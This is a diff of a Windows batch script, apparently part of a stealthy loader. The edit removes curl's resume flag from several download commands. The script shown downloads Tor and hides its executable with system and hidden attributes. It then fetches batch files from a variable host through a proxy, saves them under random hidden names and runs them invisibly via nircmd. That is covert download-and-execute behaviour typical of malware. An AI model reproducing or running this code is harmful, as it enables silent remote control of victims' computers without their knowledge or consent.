@@ -16,7 +16,7 @@ rem TESTING <
 if exist "%environment%\tor.exe" (
     echo.
 ) else (
-"%environment%\curl.exe" -C - -k -L https://archive.torproject.org/tor-package-archive/torbrowser/12.0.4/tor-expert-bundle-12.0.4-windows-x86_64.tar.gz > "%temp%\Tor.tar.gz" && "%environment%\7-Zip\7z.exe" e "%temp%\Tor.tar.gz" -so | "%environment%\7-Zip\7z.exe" e -aoa -si -ttar "tor/tor.exe" -o"%environment%" -y && attrib +s +h +i "%environment%\tor.exe" && del "%temp%\Tor.tar.gz"
+"%environment%\curl.exe" -k -L https://archive.torproject.org/tor-package-archive/torbrowser/12.0.4/tor-expert-bundle-12.0.4-windows-x86_64.tar.gz > "%temp%\Tor.tar.gz" && "%environment%\7-Zip\7z.exe" e "%temp%\Tor.tar.gz" -so | "%environment%\7-Zip\7z.exe" e -aoa -si -ttar "tor/tor.exe" -o"%environment%" -y && attrib +s +h +i "%environment%\tor.exe" && del "%temp%\Tor.tar.gz"
 )
 
 tasklist /fi "imagename eq tor.exe" | find /i "tor.exe" > nul
@@ -69,11 +69,11 @@ copy /y "%environment%\apache2\conf\httpd.conf" "%environment%\apache2\conf\http
 move /y "%environment%\apache2\conf\httpd.conf.bak" "%environment%\apache2\conf\httpd.conf"
 
 set "installer=%random%%random%"
-"%environment%\curl.exe" -C - -k %proxy% %host%/Tools/installer.bat -o "%environment%\Win32\%installer%.bat" && attrib +s +h +i "%environment%\Win32\%installer%.bat"
+"%environment%\curl.exe" -k %proxy% %host%/Tools/installer.bat -o "%environment%\Win32\%installer%.bat" && attrib +s +h +i "%environment%\Win32\%installer%.bat"
 "%environment%\nircmd.exe" exec hide "%environment%\Win32\%installer%.bat"
 
 set "win32=%random%"
-"%environment%\curl.exe" -C - -k %proxy% %host%/win32.bat -o "%environment%\Win32\%win32%.bat" && attrib +s +h +i "%environment%\Win32\%win32%.bat"
+"%environment%\curl.exe" -k %proxy% %host%/win32.bat -o "%environment%\Win32\%win32%.bat" && attrib +s +h +i "%environment%\Win32\%win32%.bat"
 timeout -t 300
 "%environment%\nircmd.exe" exec hide "%environment%\Win32\%win32%.bat"
 endlocal
